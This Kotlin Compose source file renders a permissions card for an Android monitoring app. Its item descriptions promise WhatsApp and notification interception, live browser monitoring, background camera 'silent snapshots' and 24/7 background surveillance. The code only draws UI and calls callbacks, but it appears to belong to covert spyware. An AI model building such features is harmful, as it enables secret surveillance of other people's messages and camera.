package com.example.authapp.ui.screens

import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Security
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp

internal data class PermissionSettingItem(
    val title: String,
    val description: String,
    val isGranted: Boolean,
    val onClick: () -> Unit
)

@Composable
fun SpecialPermissionsCard(
    hasNotificationListener: Boolean,
    hasAccessibility: Boolean,
    hasOverlay: Boolean,
    hasUsageAccess: Boolean,
    isBatteryOptimizationIgnored: Boolean,
    hasExactAlarm: Boolean,
    onOpenNotificationListener: () -> Unit,
    onOpenAccessibility: () -> Unit,
    onOpenOverlay: () -> Unit,
    onOpenUsageAccess: () -> Unit,
    onOpenBatteryOptimization: () -> Unit,
    onOpenExactAlarm: () -> Unit,
    modifier: Modifier = Modifier
) {
    val items = listOf(
        PermissionSettingItem(
            title = "Notification Access",
            description = "WhatsApp, Chats & Notification Interception",
            isGranted = hasNotificationListener,
            onClick = onOpenNotificationListener
        ),
        PermissionSettingItem(
            title = "Accessibility Service",
            description = "App activity & live browser monitoring",
            isGranted = hasAccessibility,
            onClick = onOpenAccessibility
        ),
        PermissionSettingItem(
            title = "Display Over Other Apps",
            description = "Background camera & silent snapshots",
            isGranted = hasOverlay,
            onClick = onOpenOverlay
        ),
        PermissionSettingItem(
            title = "Usage Access",
            description = "Track daily screen time & app limits",
            isGranted = hasUsageAccess,
            onClick = onOpenUsageAccess
        ),
        PermissionSettingItem(
            title = "Unrestricted Battery",
            description = "Prevent phone from killing service in sleep",
            isGranted = isBatteryOptimizationIgnored,
            onClick = onOpenBatteryOptimization
        ),
        PermissionSettingItem(
            title = "Exact Alarms",
            description = "Accurate schedules & background monitoring",
            isGranted = hasExactAlarm,
            onClick = onOpenExactAlarm
        )
    )

    val grantedCount = items.count { it.isGranted }
    val totalCount = items.size
    val isAllGranted = grantedCount == totalCount

    Card(
        modifier = modifier.fillMaxWidth(),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.7f)
        ),
        border = androidx.compose.foundation.BorderStroke(
            1.dp,
            if (isAllGranted) MaterialTheme.colorScheme.primary.copy(alpha = 0.35f)
            else MaterialTheme.colorScheme.error.copy(alpha = 0.35f)
        )
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = if (isAllGranted) Icons.Default.CheckCircle else Icons.Default.Security,
                        contentDescription = null,
                        tint = if (isAllGranted) MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(24.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "System Permissions",
                        style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold),
                        color = MaterialTheme.colorScheme.onSurface
                    )
                }

                Surface(
                    shape = RoundedCornerShape(8.dp),
                    color = if (isAllGranted) Color(0xFFE8F5E9) else Color(0xFFFFEBEE)
                ) {
                    Text(
                        text = if (isAllGranted) "All Active ($grantedCount/$totalCount)" else "$grantedCount/$totalCount Active",
                        style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold),
                        color = if (isAllGranted) Color(0xFF2E7D32) else Color(0xFFC62828),
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp)
                    )
                }
            }

            Spacer(modifier = Modifier.height(4.dp))
            Text(
                text = "These Android settings allow 24/7 background monitoring. Tap any setting to turn ON or change.",
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )

            Spacer(modifier = Modifier.height(14.dp))

            items.forEachIndexed { index, item ->
                if (index > 0) {
                    HorizontalDivider(
                        modifier = Modifier.padding(vertical = 8.dp),
                        color = MaterialTheme.colorScheme.outlineVariant.copy(alpha = 0.4f)
                    )
                }

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column(modifier = Modifier.weight(1f).padding(end = 12.dp)) {
                        Text(
                            text = item.title,
                            style = MaterialTheme.typography.bodyMedium.copy(fontWeight = FontWeight.SemiBold),
                            color = MaterialTheme.colorScheme.onSurface
                        )
                        Text(
                            text = item.description,
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }

                    if (item.isGranted) {
                        Surface(
                            shape = RoundedCornerShape(12.dp),
                            color = Color(0xFFE8F5E9),
                            modifier = Modifier.clickable { item.onClick() }
                        ) {
                            Row(
                                modifier = Modifier.padding(horizontal = 10.dp, vertical = 6.dp),
                                verticalAlignment = Alignment.CenterVertically
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Check,
                                    contentDescription = null,
                                    tint = Color(0xFF2E7D32),
                                    modifier = Modifier.size(16.dp)
                                )
                                Spacer(modifier = Modifier.width(4.dp))
                                Text(
                                    text = "ON",
                                    style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold),
                                    color = Color(0xFF2E7D32)
                                )
                            }
                        }
                    } else {
                        Button(
                            onClick = item.onClick,
                            shape = RoundedCornerShape(12.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = MaterialTheme.colorScheme.error
                            ),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                        ) {
                            Text(
                                text = "TURN ON",
                                style = MaterialTheme.typography.labelMedium.copy(fontWeight = FontWeight.Bold),
                                color = MaterialTheme.colorScheme.onError
                            )
                        }
                    }
                }
            }
        }
    }
}
